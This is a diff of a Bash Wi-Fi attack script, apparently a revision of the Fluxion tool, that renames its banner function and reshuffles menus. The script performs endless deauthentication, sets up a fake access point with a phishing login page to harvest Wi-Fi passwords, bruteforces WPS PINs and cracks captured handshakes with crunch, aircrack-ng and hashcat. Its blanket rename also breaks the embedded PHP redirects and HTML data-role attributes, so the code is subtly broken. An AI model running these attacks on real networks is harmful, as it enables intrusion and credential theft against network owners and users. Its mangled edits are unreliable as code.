@@ -24,7 +24,7 @@ ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*)
 # Deauth duration during handshake capture
 # oo
 DEAUTHTIME="9999999999999"
-revision=38
+revision=39
 version=0.23
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -109,7 +109,7 @@ trap exitmode SIGINT SIGHUP
 # KILL ALL
 function exitmode {
 	conditional_clear
-	mostrarheader
+	top
 	echo -e "\n\n"$white"["$red"-"$white"] "$red"Cleaning and closing"$transparent""
 
 	if ps -A | grep -q aireplay-ng; then
@@ -183,6 +183,9 @@ function exitmode {
 	service network-manager restart &> $flux_output_device &
 	service networking restart &> $flux_output_device &
 	echo -e ""$white"["$green"+"$white"] "$green"Cleanup performed successfully!"$transparent""
+	echo -e ""$white"["$green"+"$white"] "$grey"Thanks for using fluxion"$transparent""
+	sleep 1 
+	clear
 	exit
 
 }
@@ -260,7 +263,7 @@ DIALOG_WEB_LENGHT_MIN_POR="A senha deve ter mais de 7 caracteres"
 DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que 64 caracteres"
 
 # Design
-function mostrarheader(){
+function top(){
 
 	conditional_clear
 	echo -e "$blue#########################################################"
@@ -501,7 +504,7 @@ function checkdependences {
 	sleep 1
 	clear
 }
-mostrarheader
+top
 checkdependences
 
 # Create working directory
@@ -576,7 +579,8 @@ function infoap {
 	echo -e "               "$blue"SSID"$transparent" = $Host_SSID / $Host_ENC"
 	echo -e "               "$blue"Channel"$transparent" = $channel"
 	echo -e "               "$blue"Speed"$transparent" = ${speed:2} Mbps"
-	echo -e "               "$blue"BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL"$transparent")"
+	echo -e "               "$blue"BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL $transparent)"
+	echo -e "               "$blue"WPS"$transparent" = $wps"$transparent""
 	echo
 }
 
@@ -670,25 +674,23 @@ function menuattack {
 
 	while true; do
 		conditional_clear
-		mostrarheader
+		top
 		echo Autodetect Resolution ...
 		echo $detectedresolution
 		echo
 		echo "Select option"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" Crack Wifi            "
-		echo -e "      "$blue"2)"$transparent" Other          "
+		echo -e "      "$blue"1)"$transparent" Crack Wifi         "
+		echo -e "      "$blue"2)"$transparent" Misc          "
 		echo -e "      "$blue"3)"$red" Exit     "$transparent""
 		echo "                                       "
 		echo -n "      #> "
 		read sn
 		echo ""
 		case $sn in
-			1 ) wifiattack; break ;;
-			2 ) nmapPort ; break ;;
-			3 ) dumper ; break ;;
-			4 ) analyze; break ;;
-			5 ) exitmode ;;  
+			1 ) setinterface; break ;;
+			2 ) other; break ;; 
+			3 ) exitmode; break;; 
 			* ) echo "Unknown option. Please choose again" ;;
 		  esac
 	done
@@ -702,7 +704,7 @@ conditional_clear
 
 	while true; do
 		conditional_clear
-		mostrarheader
+		top
 		echo Autodetect Resolution ...
 		echo $detectedresolution
 		echo
@@ -711,7 +713,7 @@ conditional_clear
 		echo -e "      "$blue"1)"$transparent" Scan open Ports [nmap]      "
 		echo -e "      "$blue"2)"$transparent" Capture data [tcpdump]      "
 		echo -e "      "$blue"3)"$transparent" Analyze data [custom script]      "	
-		echo -e "      "$blue"4)"$red"Exit"
+		echo -e "      "$blue"4)"$red" Back" $transparent""
 		echo "                                       "
 		echo -n "      #> "
 		read sn
@@ -720,46 +722,20 @@ conditional_clear
 					1 ) nmapPort ; break ;;
 					2 ) dumper ; break ;;
 					3 ) analyze; break ;;
-					4 ) exitmode ;;  
+					4 ) menuattack; break ;;  
 					* ) echo "Unknown option. Please choose again" ;;
 				  esac
 			done
 
 }
 
-function wifiattack {
-	conditional_clear
 
-	while true; do 
-		conditional_clear
-		mostrarheader
-
-		echo "Select option"
-		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" WPA/2 Attack           "
-		echo -e "      "$blue"2)"$transparent" WPS Attack      "
-		echo -e "      "$blue"3)"$red" Back      "$transparent""
-		echo "                                       "
-		echo -n "      #> "
-		read yn
-		echo ""
-		case $yn in
-			1 ) setinterface ; break ;;
-			2 ) setinterface2 ; break ;;
-			3 ) menuattack; break ;;  
-			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
-		  esac
-	done
-
-
-
-}
 function nmapPort {
 	
 	conditional_clear
 	while true; do
 		conditional_clear
-		mostrarheader
+		top
 		echo "Select channel"
 		echo "                                       "
 		echo -e "      "$blue"1)"$transparent" Intense Scan [TCP & UDP]           "
@@ -784,7 +760,7 @@ function nmapPort {
 }
 function nmapintenseTU {
 	 conditional_clear
-	 mostrarheader
+	 top
 	 echo -e ""$red"The windows isn’t crashed"
 	 echo -e ""$transparent"Stored in /root/nmap.txt"
 	 echo
@@ -802,7 +778,7 @@ function nmapintenseTU {
 
 function nmapintenseT {
 	conditional_clear
-	mostrarheader
+	top
 	echo -e ""$red"The windows isn't crashed"
 	echo
 	echo -e ""$blue"IP: "$red"$ipNmap"
@@ -818,7 +794,7 @@ function nmapintenseT {
 
 function nmapregular {
 	conditional_clear
-	mostrarheader
+	top
 	echo -e ""$red"The windows isn't crashed"
 	echo
 	echo -e ""$blue"IP: "$red"$ipNmap"
@@ -835,7 +811,7 @@ function nmapregular {
 
 function nmapquick {
 	conditional_clear
-	mostrarheader
+	top
 	echo -e ""$red"The windows isn't crashed"
 	echo
 	echo -e ""$blue"IP: "$red"$ipNmap"
@@ -852,7 +828,7 @@ function nmapquick {
 
 function dumper {
 	conditional_clear
-	mostrarheader
+	top
 	readarray -t wirelessifaces < <(./airmon |grep "-" | cut -d- -f1)
 	INTERFACESNUMBER=`./airmon| grep -c "-"`
 
@@ -882,11 +858,11 @@ fi
 		xterm $HOLD -title "Quíck Scan " $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e tcpdump -i $PREWIFI -w $DUMP_PATH/dumper.cap
 
 		conditional_clear
-		mostrarheader
+		top
 
 		while true; do
 		conditional_clear
-		mostrarheader
+		top
 		echo "Store session?"
 		echo "                                       "
 		echo -e "      "$blue"1)"$transparent" Yes          "
@@ -905,7 +881,7 @@ fi
 
 function dumpermenu2 {
 		conditional_clear
-		mostrarheader
+		top
 
 		if [ $yn -eq "1" ]; then
 			text="Files saved in /root/dzmper.cap"
@@ -916,7 +892,7 @@ function dumpermenu2 {
 
 		while true; do
 		conditional_clear
-		mostrarheader
+		top
 		echo -e ""$red"$text""$transparent"
 		echo "Select option"
 		echo "                                       "
@@ -940,7 +916,7 @@ function analyze {
 	conditional_clear
 	while true; do
 		conditional_clear
-		mostrarheader
+		top
 		echo -e ""$red"This feature is at the moment not enabled"$transparent""
 		echo
 		echo "Select option"
@@ -966,7 +942,7 @@ function analyze2 {
 		tcpdumpcapĺocation="/root/dumper.cap"
 	else
 		conditional_clear
-		mostrarheader
+		top
 		echo "Where is the .cap file located? e.g. /root/Handshakes/"
 		echo
 		echo -n "      #> "
@@ -978,7 +954,7 @@ function analyze2 {
 # Choose Interface
 function setinterface {
 	conditional_clear
-	mostrarheader
+	top
 	#unblock interfaces
 	rfkill unblock all
 
@@ -1013,7 +989,7 @@ function setinterface {
 
 		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
 			conditional_clear
-			mostrarheader
+			top
 			setinterface
 		fi
 
@@ -1067,7 +1043,7 @@ function choosescan {
 
 	while true; do
 		conditional_clear
-		mostrarheader
+		top
 
 		echo "Select channel"
 		echo "                                       "
@@ -1089,7 +1065,7 @@ function choosescan {
 function Scanchan {
 
 	conditional_clear
-	mostrarheader
+	top
 
 	  echo "                                       "
 	  echo "      Select Channel     "
@@ -1104,21 +1080,21 @@ function Scanchan {
 	conditional_clear
 
 	rm -rf $DUMP_PATH/dump*
-	xterm $HOLD -title "Scanning Target  [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one
+	xterm $HOLD -title "Scanning Target  [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one --wps
 }
 
 # Scans the entire network
 function Scan {
 
 	conditional_clear
-	xterm $HOLD -title "WIFI Monitor" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one
+	xterm $HOLD -title "WIFI Monitor" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one --wps
 }
 
 # Choose a network
 function selection {
 
 	conditional_clear
-	mostrarheader
+	top
 
 
 	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
@@ -1133,11 +1109,11 @@ function selection {
 	tail -n +$fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
 	echo "                        WIFI LIST "
 	echo ""
-	echo " ID      MAC                      CHAN    SECU     PWR    ESSID"
+	echo " ID      MAC                      CHAN    SECU     PWR   WPS ESSID"
 	echo ""
 	i=0
 
-	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
+	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH WPS  ESSID KEY;do
 		longueur=${#MAC}
 		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
 		PRIVACY=${PRIVACY:0:4}
@@ -1165,7 +1141,7 @@ function selection {
 		fi
 	done < $DUMP_PATH/dump-02.csv
 	echo
-	echo -e ""$green "("$white"*"$green ")Active clients"$transparent""
+	echo -e ""$green "("$white"*"$green")Active clients"$transparent""
 	echo ""
 	echo -e "        Select target. For rescan type$red r$transparent"
 	echo -n "      #> "
@@ -1278,7 +1254,7 @@ function askAP {
 		askauth
 	fi
 
-	mostrarheader
+	top
 	while true; do
 
 		infoap
@@ -1289,8 +1265,7 @@ function askAP {
 		echo -e "      "$blue"2)"$transparent" FakeAP - airbase-ng (Slower connection)"
 		echo -e "      "$blue"3)"$transparent" WPS-SLAUGHTER - Bruteforce WPS Pin"
 		echo -e "      "$blue"4)"$transparent" Bruteforce - (Handshake is required)"
-		echo -e "      "$blue"5)"$transparent" Wifite - Automated Network Hacking"
-		echo -e "      "$blue"6)"$transparent" Back"
+		echo -e "      "$blue"5)"$red" Back" $transparent""
 		echo "                                       "
 		echo -n "      #> "
 		read yn
@@ -1300,24 +1275,19 @@ function askAP {
 			2 ) fakeapmode="airbase-ng"; askauth; break ;;
 			3 ) fakeapmode="WPS-SLAUGHTER"; wps; break ;;
 			4 ) fakeapmode="Aircrack-ng"; Bruteforce; break;;
-			5 ) wifite ;wifite; break;;
-			6 ) selection; break ;;
+			5 ) selection; break ;;
 			* ) echo "Unknown option. Choose again"; conditional_clear ;;
 		esac
 	done
 
 }
 
-#wifite Not finished yet
-function wifite {
-	python wifite.py
-}
 # Test Passwords / airbase-ng
 function askauth {
 
 	conditional_clear
 
-	mostrarheader
+	top
 	while true; do
 
 		echo "METHOD TO VERIFY THE PASSWORD"
@@ -1646,7 +1616,7 @@ sleep 1
 
 WPS_ATTACK_MENU()
 {
-mostrarheader
+top
 echo "Which Attack Would You Like To Use?"
 		echo "                                       "
 		echo -e "      "$blue"0)"$transparent" Select New Target Network"
@@ -1666,7 +1636,7 @@ echo "Which Attack Would You Like To Use?"
 }
 
 
-mostrarheader
+top
 echo "How many Wlan Adapters would You like to use?"
 echo "                                       "
 echo -e ""$blue"1)"$transparent" 1 Adapter"
@@ -1679,19 +1649,19 @@ read a
 case $a in
 	1)
 clear
-mostrarheader
+top
 echo
 read -p " - What is the name of your Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
 
 
 clear
-mostrarheader
+top
 enable_mon_mode_1
 
 sleep 1
 
 clear
-mostrarheader
+top
 echo "Would you like to Change the Wlan WIFI_MONITOR's MAC Address?"
 		echo "                                       "
 		echo -e "      "$blue"1)"$transparent" Yes"
@@ -1702,7 +1672,7 @@ read c
 case $c in
 	1)
 clear
-mostrarheader
+top
 mac_change_1
 
 sleep 1
@@ -1725,7 +1695,7 @@ read d
 case $d in
 	0)
 clear
-mostrarheader
+top
 scan_for_targets
 enable_mon_mode_1
 menu
@@ -1822,7 +1792,7 @@ menu
 ;;
 	2)
 clear
-mostrarheader
+top
 echo
 read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
 clear
@@ -1968,7 +1938,7 @@ menu
 ;;
 	3)
 clear
-mostrarheader
+top
 echo
 read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
 clear
@@ -1992,7 +1962,7 @@ enable_mon_mode_3
 
 clear
 
-mostrarheader
+top
 echo "Would you like to set the 3 WIFI_MONITORs to an Identical MAC Address?"
 echo "                                       "
 echo -e "      "$blue"1)"$transparent" Yes"
@@ -2123,7 +2093,7 @@ menu
 ;;
 	4)
 clear
-mostrarheader
+top
 echo
 read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
 clear
@@ -2281,7 +2251,7 @@ menu
 ;;
 	5)
 clear
-mostrarheader
+top
 echo
 read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
 clear
@@ -2451,7 +2421,7 @@ esac
 
 function Bruteforce {
 clear
-mostrarheader
+top
 echo
 echo "*** Which Method Would You Like To Use? ***"
 echo
@@ -2467,14 +2437,14 @@ read a
 case $a in
 	1)
 clear
-mostrarheader
+top
 echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
 echo
 echo -n "--> "
 read CAPLOCATION
 cd $CAPLOCATION
 clear
-mostrarheader
+top
 echo "Here are the files in the location you entered:"
 echo
 ls
@@ -2484,7 +2454,7 @@ echo
 echo -n "--> "
 read CAPNAME
 clear
-mostrarheader
+top
 echo "$CAPNAME"
 echo
 echo "What is the BSSID of the Network? ex:(XX:XX:XX:XX:XX:XX) "
@@ -2492,19 +2462,19 @@ echo
 echo -n "--> "
 read BSSID
 clear
-mostrarheader
+top
 echo "What is the Min password length? ex:5"
 echo
 echo -n "--> "
 read MIN
 clear
-mostrarheader
+top
 echo "What is the Max password length? ex:16"
 echo
 echo -n "--> "
 read MAX
 clear
-mostrarheader
+top
 echo "What is the Char. Set you wish to use? "
 echo
 echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
@@ -2546,7 +2516,7 @@ case $b in
 	7)
 
 clear
-mostrarheader
+top
 echo "Enter the characters you wish to use for cracking."
 echo "Ex: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 echo
@@ -2563,14 +2533,14 @@ crunch $MIN $MAX $CHARSET | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
 ;;
 	2)
 clear
-mostrarheader
+top
 echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
 echo
 echo -n "--> "
 read CAPLOCATION
 cd $CAPLOCATION
 clear
-mostrarheader
+top
 echo "Here are the files in the location you entered:"
 echo
 ls
@@ -2580,7 +2550,7 @@ echo
 echo -n "--> "
 read CAPNAME
 clear
-mostrarheader
+top
 echo "$CAPNAME"
 echo
 echo "What is the BSSID of the Network? ex:(XX:XX:XX:XX:XX:XX) "
@@ -2588,13 +2558,13 @@ echo
 echo -n "--> "
 read BSSID
 clear
-mostrarheader
+top
 echo "What is the password length? ex:16"
 echo
 echo -n "--> "
 read MAX
 clear
-mostrarheader
+top
 echo "What is the Char. Set you wish to use? "
 echo
 echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
@@ -2635,7 +2605,7 @@ case $c in
 ;;
 	7)
 clear
-mostrarheader
+top
 echo "Enter the characters you wish to use for cracking."
 echo "Ex: ABCDEF0123456789"
 echo
@@ -2652,14 +2622,14 @@ cat /dev/urandom | tr -dc $CHARSET | fold -w $MAX | aircrack-ng --bssid $BSSID -
 ;;
 	3)
 clear
-mostrarheader
+top
 echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
 echo
 echo -n "--> "
 read CAPLOCATION
 cd $CAPLOCATION
 clear
-mostrarheader
+top
 echo "Here are the files in the location you entered:"
 echo
 ls
@@ -2669,14 +2639,14 @@ echo
 echo -n "--> "
 read CAPNAME
 clear
-mostrarheader
+top
 echo "What is the location of your Dictionary? ex: /root/Wordlists/ "
 echo
 echo -n "--> "
 read DICTLOCATION
 clear
 cd $DICTLOCATION
-mostrarheader
+top
 echo "Here are the files in the location you entered:"
 echo
 ls
@@ -2690,14 +2660,14 @@ aircrack-ng $CAPLOCATION$CAPNAME -w $DICTLOCATION$DICTNAME
 ;;
 	4)
 clear
-mostrarheader
+top
 echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
 echo
 echo -n "--> "
 read CAPLOCATION
 cd $CAPLOCATION
 clear
-mostrarheader
+top
 echo "Here are the files in the location you entered:"
 echo
 ls
@@ -2707,7 +2677,7 @@ echo
 echo -n "--> "
 read CAPNAME
 clear
-mostrarheader
+top
 echo "$CAPNAME"
 echo
 echo "What is the BSSID of the Network? ex:(XX:XX:XX:XX:XX:XX) "
@@ -2715,13 +2685,13 @@ echo
 echo -n "--> "
 read BSSID
 clear
-mostrarheader
+top
 echo "What is the Area Code? ex:(530) "
 echo
 echo -n "--> "
 read AREACODE
 clear
-mostrarheader
+top
 echo -e "[-] Select a phone number format:"
 echo ""
 echo -e "[1] (555)555-5555  [13 chars]"
@@ -2759,14 +2729,14 @@ esac
 ;;
 	5)
 clear
-mostrarheader
+top
 echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
 echo
 echo -n "--> "
 read CAPLOCATION
 cd $CAPLOCATION
 clear
-mostrarheader
+top
 echo "Here are the files in the location you entered:"
 echo
 ls
@@ -2776,22 +2746,22 @@ echo
 echo -n "--> "
 read CAPNAME
 clear
-mostrarheader
+top
 echo "Will now convert .cap to .hccap ,Please wait..."
 sleep 3
 clear
-mostrarheader
+top
 wpaclean $CAPLOCATION$CAPNAME"wpacleaned".cap $CAPLOCATION$CAPNAME
 clear
-mostrarheader
+top
 aircrack-ng $CAPLOCATION$CAPNAME"wpacleaned".cap -J $CAPLOCATION$CAPNAME
 clear
-mostrarheader
+top
 rm $CAPLOCATION$CAPNAME"wpacleaned".cap
 echo "Conversion Complete!!..."
 sleep 3
 clear
-mostrarheader
+top
 echo "Enter the MASK you wish to use for cracking."
 echo
 echo "?l = abcdefghijklmnopqrstuvwxyz"
@@ -2806,7 +2776,7 @@ echo
 echo -n "--> "
 read MASK
 clear
-mostrarheader
+top
 hashcat -m 2500 -a 3 $CAPLOCATION$CAPNAME.hccap $MASK
 ;;
 	*)
@@ -2824,7 +2794,7 @@ function Bruteforce2 {
 BSSID="$Host_MAC"
 CAPNAME="$Host_SSID-$Host_MAC.cap"
 clear
-mostrarheader
+top
 echo
 echo "*** Which Method Would You Like To Use? ***"
 echo
@@ -2842,19 +2812,19 @@ case $a in
 
 cd $HANDSHAKES_PATH
 clear
-mostrarheader
+top
 echo "What is the Min password length? ex:5"
 echo
 echo -n "--> "
 read MIN
 clear
-mostrarheader
+top
 echo "What is the Max password length? ex:16"
 echo
 echo -n "--> "
 read MAX
 clear
-mostrarheader
+top
 echo "What is the Char. Set you wish to use? "
 echo
 echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
@@ -2896,7 +2866,7 @@ case $b in
 	7)
 
 clear
-mostrarheader
+top
 echo "Enter the characters you wish to use for cracking."
 echo "Ex: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 echo
@@ -2916,13 +2886,13 @@ crunch $MIN $MAX $CHARSET | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPN
 cd $HANDSHAKES_PATH
 
 clear
-mostrarheader
+top
 echo "What is the password length? ex:16"
 echo
 echo -n "--> "
 read MAX
 clear
-mostrarheader
+top
 echo "What is the Char. Set you wish to use? "
 echo
 echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
@@ -2963,7 +2933,7 @@ case $c in
 ;;
 	7)
 clear
-mostrarheader
+top
 echo "Enter the characters you wish to use for cracking."
 echo "Ex: ABCDEF0123456789"
 echo
@@ -2982,7 +2952,7 @@ cat /dev/urandom | tr -dc $CHARSET | fold -w $MAX | aircrack-ng --bssid $BSSID -
 
 cd $HANDSHAKES_PATH
 clear
-mostrarheader
+top
 echo "Here are the files in the location you entered:"
 echo
 ls
@@ -2992,14 +2962,14 @@ echo
 echo -n "--> "
 read CAPNAME
 clear
-mostrarheader
+top
 echo "What is the location of your Dictionary? ex: /root/Wordlists/ "
 echo
 echo -n "--> "
 read DICTLOCATION
 clear
 cd $DICTLOCATION
-mostrarheader
+top
 echo "Here are the files in the location you entered:"
 echo
 ls
@@ -3016,13 +2986,13 @@ aircrack-ng $HANDSHAKES_PATH$CAPNAME -w $DICTLOCATION$DICTNAME
 cd $HANDSHAKES_PATH
 
 clear
-mostrarheader
+top
 echo "What is the Area Code? ex:(530) "
 echo
 echo -n "--> "
 read AREACODE
 clear
-mostrarheader
+top
 echo -e "[-] Select a phone number format:"
 echo ""
 echo -e "[1] (555)555-5555  [13 chars]"
@@ -3060,14 +3030,14 @@ esac
 ;;
 	5)
 clear
-mostrarheader
+top
 echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
 echo
 echo -n "--> "
 read CAPLOCATION
 cd $CAPLOCATION
 clear
-mostrarheader
+top
 echo "Here are the files in the location you entered:"
 echo
 ls
@@ -3077,22 +3047,22 @@ echo
 echo -n "--> "
 read CAPNAME
 clear
-mostrarheader
+top
 echo "Will now convert .cap to .hccap ,Please wait..."
 sleep 3
 clear
-mostrarheader
+top
 wpaclean $CAPLOCATION$CAPNAME"wpacleaned".cap $CAPLOCATION$CAPNAME
 clear
-mostrarheader
+top
 aircrack-ng $CAPLOCATION$CAPNAME"wpacleaned".cap -J $CAPLOCATION$CAPNAME
 clear
-mostrarheader
+top
 rm $CAPLOCATION$CAPNAME"wpacleaned".cap
 echo "Conversion Complete!!..."
 sleep 3
 clear
-mostrarheader
+top
 echo "Enter the MASK you wish to use for cracking."
 echo
 echo "?l = abcdefghijklmnopqrstuvwxyz"
@@ -3107,7 +3077,7 @@ echo
 echo -n "--> "
 read MASK
 clear
-mostrarheader
+top
 hashcat -m 2500 -a 3 $CAPLOCATION$CAPNAME.hccap $MASK
 ;;
 	*)
@@ -3123,7 +3093,7 @@ function handshakelocation {
 
 	conditional_clear
 
-	mostrarheader
+	top
 	infoap
 	echo
 	echo -e "handshake location  (Example: $red$WORK_DIR.cap$transparent)"
@@ -3194,7 +3164,7 @@ function deauthforce {
 
 	conditional_clear
 
-	mostrarheader
+	top
 	while true; do
 
 		echo "handshake check"
@@ -3231,7 +3201,7 @@ function askclientsel {
 	conditional_clear
 
 	while true; do
-		mostrarheader
+		top
 
 		echo "Capture Handshake"
 		echo "                                       "
@@ -3309,7 +3279,7 @@ function deauthMENU {
 		conditional_clear
 
 		clear
-		mostrarheader
+		top
 
 		echo "*Capture Handshake* "
 		echo
@@ -3403,7 +3373,7 @@ function webinterface {
 
 	while true; do
 		conditional_clear
-		mostrarheader
+		top
 
 		infoap
 		echo
@@ -3429,7 +3399,7 @@ function webinterface {
 
 		while true; do
 			conditional_clear
-			mostrarheader
+			top
 			infoap
 			echo
 			echo "Select Login Page"
@@ -3639,11 +3609,11 @@ while(1)
 {
 
 if (file_get_contents(\"\$intento\") == 2) {
-	    header(\"location:final.html\");
+	    top(\"location:final.html\");
 	    break;
 	}
 if (file_get_contents(\"\$intento\") == 1) {
-	    header(\"location:error.html\");
+	    top(\"location:error.html\");
 	    unlink(\$intento);
 	    break;
 	}
@@ -3841,7 +3811,7 @@ function attack {
 	conditional_clear
 
 	while true; do
-		mostrarheader
+		top
 
 		echo "Attack in progress .."
 		echo "                                       "
@@ -6811,7 +6781,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zi
 	</head>
 	<body>
 	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-		<div data-role=\"header\" data-theme=\"a\">
+		<div data-role=\"top\" data-theme=\"a\">
 		    <h3>Login Page</h3>
 		</div>
 
@@ -6825,7 +6795,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zi
 		</div>
 	    </div>
 	    <div data-role=\"page\" id=\"second\">
-		<div data-theme=\"a\" data-role=\"header\">
+		<div data-theme=\"a\" data-role=\"top\">
 		    <h3></h3>
 		</div>
 
@@ -6850,7 +6820,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zi
 	</head>
 	<body>
 	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-		<div data-role=\"header\" data-theme=\"a\">
+		<div data-role=\"top\" data-theme=\"a\">
 		    <h3>Login Page</h3>
 		</div>
 
@@ -6867,7 +6837,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zi
 		</div>
 	    </div>
 	    <div data-role=\"page\" id=\"second\">
-		<div data-theme=\"a\" data-role=\"header\">
+		<div data-theme=\"a\" data-role=\"top\">
 		    <h3></h3>
 		</div>
 
@@ -6916,7 +6886,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zi
 	</head>
 	<body>
 	    <div data-role=\"page\" id=\"login\" data-theme=\"b\">
-		<div data-role=\"header\" data-theme=\"a\">
+		<div data-role=\"top\" data-theme=\"a\">
 		    <h3>Login Page</h3>
 		</div>
 
@@ -6957,7 +6927,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA="| base64 -d >$DUMP_PATH/file.zi
 		</div>
 	    </div>
 	    <div data-role=\"page\" id=\"second\">
-		<div data-theme=\"a\" data-role=\"header\">
+		<div data-theme=\"a\" data-role=\"top\">
 		    <h3></h3>
 		</div>
 
@@ -7108,4 +7078,4 @@ mkdir $DUMP_PATH/data &>$flux_output_device
 ######################################### < INTERFACE WEB > ########################################
 
 
-mostrarheader && setresolution && setinterface
+top&& setresolution && setinterface
